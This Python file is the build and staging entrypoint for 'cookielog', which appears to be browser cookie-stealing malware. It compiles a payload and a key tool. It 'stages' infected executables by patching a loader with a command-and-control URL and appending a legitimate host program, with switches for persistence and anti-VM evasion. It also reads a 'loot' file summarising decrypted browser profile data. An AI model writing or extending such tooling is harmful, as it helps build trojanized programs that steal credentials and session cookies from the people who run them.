#!/usr/bin/env python3
"""build.py -- one entrypoint for build, verify and staging.

    python build.py check                  # toolchain, deps, artifacts, slots
    python build.py all                    # payload + keytool + verify
    python build.py payload                # build.bat (falls back to clang)
    python build.py keytool                # build_keytool.bat
    python build.py verify                 # artifacts and loader slots
    python build.py stage HOST --c2 URL    # patch loader, append host
    python build.py test                   # unit tests (stdlib unittest)
    python build.py hash                   # sha256 of bin/

The old .bat files stay callable; they are the toolchain layer. This script is
the single command the rest of the repo (and install.ps1) talks to.
"""
import argparse
import importlib.util
import os
import struct
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from cklog import build as B            # noqa: E402
from cklog import coverage as C         # noqa: E402
from cklog import pe                    # noqa: E402


def _ok(flag):
    return "ok" if flag else "MISSING"


def cmd_check(args):
    print("host:     %s %s" % (sys.platform, sys.version.split()[0]))
    print("root:     %s" % HERE)

    deps = []
    for mod in ("cryptography", "websocket"):
        deps.append((mod, importlib.util.find_spec(mod) is not None))
    print("python deps: " + ", ".join("%s=%s" % (m, _ok(v)) for m, v in deps))

    if sys.platform == "win32":
        ok, info = B.toolchain_status(HERE)
        print("toolchain: %s%s" % (_ok(ok), (" (%s)" % info) if info else ""))
    else:
        print("toolchain: n/a on this host (bin/ is prebuilt)")

    print("\nartifacts:")
    bad = 0
    for r in B.artifacts(HERE):
        if not r["exists"]:
            print("  %-12s %-22s MISSING%s" % (r["key"], r["rel"],
                                               "" if r["required"] else " (optional)"))
            if r["required"]:
                bad += 1
            continue
        print("  %-12s %-22s %8d  %s  %s" % (r["key"], r["rel"], r["size"],
                                            "PE" if r["pe"] else "not PE",
                                            r["sha256"][:16]))
        if r["required"] and not r["pe"]:
            bad += 1

    slots = B.sentinels(HERE)
    if slots:
        print("\nloader slots:")
        for s in slots:
            print("  %-8s %-8s %s" % (s["name"], s["state"],
                                      ("@%d %s" % (s["offset"], s["section"])) if s["offset"] >= 0 else ""))
    print("\n%s" % ("ready" if bad == 0 else "%d required artifact(s) missing" % bad))
    return 0 if bad == 0 else 1


def cmd_verify(args):
    rows = B.artifacts(HERE)
    bad = [r for r in rows if r["required"] and not (r["exists"] and r["pe"])]
    for r in rows:
        print("%-12s %-22s %s" % (r["key"], r["rel"], _ok(r["exists"] and r["pe"])))
    for s in B.sentinels(HERE):
        print("slot %-8s %s" % (s["name"], s["state"]))
    return 0 if not bad else 1


def cmd_all(args):
    if sys.platform != "win32":
        print("build scripts are Windows-only; nothing to do on this host")
        return 1
    ok, info = B.toolchain_status(HERE)
    if not ok:
        print("no usable toolchain: %s" % info)
        return 1
    print("toolchain: %s" % info)
    print("\n[payload]")
    ok, out = B.build_payload(HERE)
    print(out)
    if not ok:
        return 1
    print("\n[keytool]")
    ok, out = B.build_keytool(HERE)
    print(out)
    if not ok:
        return 1
    print("\n[verify]")
    return cmd_verify(args)


def cmd_payload(args):
    ok, out = B.build_payload(HERE)
    print(out)
    return 0 if ok else 1


def cmd_keytool(args):
    ok, out = B.build_keytool(HERE)
    print(out)
    return 0 if ok else 1


def cmd_hash(args):
    for r in B.artifacts(HERE):
        if r["exists"]:
            print("%s  %8d  %s" % (r["sha256"], r["size"], r["rel"]))
    return 0


def _verify_staged(blob, c2):
    """Cheap structural checks on [loader][host][len][CKLG]."""
    problems = []
    if blob[:2] != b"MZ":
        problems.append("no MZ header")
    if not blob.endswith(b"CKLG"):
        problems.append("no CKLG tail")
    else:
        hlen = struct.unpack_from("<I", blob, len(blob) - 8)[0]
        if hlen <= 0 or hlen + 8 > len(blob) - 2:
            problems.append("host length out of range")
    if c2 and c2.encode("utf-8") not in blob:
        problems.append("C2 URL absent from loader")
    if len(blob) < 200 * 1024:
        problems.append("suspiciously small package")
    return problems


def cmd_stage(args):
    import auto

    if not os.path.isfile(args.host):
        print("host not found: %s" % args.host)
        return 1
    if len(args.c2) > 255:
        print("C2 URL longer than the 256-byte slot")
        return 1
    blob = auto.build_infected_bytes(args.host, args.c2,
                                     persist=args.persist,
                                     no_anti_vm=args.no_anti_vm)
    out = args.output or os.path.join(HERE, "ifec", "apps", os.path.basename(args.host))
    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
    with open(out, "wb") as f:
        f.write(blob)

    problems = _verify_staged(blob, args.c2)
    print("staged:   %s" % out)
    print("size:     %d bytes" % len(blob))
    print("sha256:   %s" % pe.sha256(blob))
    print("c2:       %s" % args.c2)
    print("persist:  %s" % ("on" if args.persist else "off"))
    print("anti-vm:  %s" % ("off" if args.no_anti_vm else "on"))
    for p in problems:
        print("problem:  %s" % p)
    return 0 if not problems else 1


def cmd_test(args):
    import unittest
    loader = unittest.TestLoader()
    suite = loader.discover(os.path.join(HERE, "tests"), pattern="test_*.py",
                            top_level_dir=HERE)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    return 0 if result.wasSuccessful() else 1


def cmd_coverage(args):
    rows = C.load_all(os.path.join(HERE, "loot"))
    if not rows:
        print("no coverage manifests in loot/coverage.jsonl")
        return 0
    for m in rows:
        print(C.summarize(m))
        for s in m.get("sources", []):
            label = s.get("browser") or s.get("kind") or "?"
            detail = s.get("skipped") or ("%d/%d" % (s.get("decrypted", 0), s.get("rows", 0)))
            print("  %-10s %-14s %s" % (label, (s.get("profile") or "-")[:14], detail))
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="cookielog build and staging")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("check", help="toolchain, deps, artifacts, slots")
    sub.add_parser("verify", help="artifacts and loader slots")
    sub.add_parser("all", help="payload + keytool + verify")
    sub.add_parser("payload", help="build payload with build.bat")
    sub.add_parser("keytool", help="build ckkey.exe")
    sub.add_parser("hash", help="sha256 of bin/")
    sub.add_parser("test", help="unit tests")
    sub.add_parser("coverage", help="read loot/coverage.jsonl")

    st = sub.add_parser("stage", help="patch loader and append host")
    st.add_argument("host")
    st.add_argument("--c2", required=True)
    st.add_argument("--persist", action="store_true")
    st.add_argument("--no-anti-vm", action="store_true")
    st.add_argument("-o", "--output")

    args = ap.parse_args(argv)
    fn = {"check": cmd_check, "verify": cmd_verify, "all": cmd_all,
          "payload": cmd_payload, "keytool": cmd_keytool, "hash": cmd_hash,
          "test": cmd_test, "stage": cmd_stage, "coverage": cmd_coverage}[args.cmd]
    return fn(args)


if __name__ == "__main__":
    sys.exit(main())
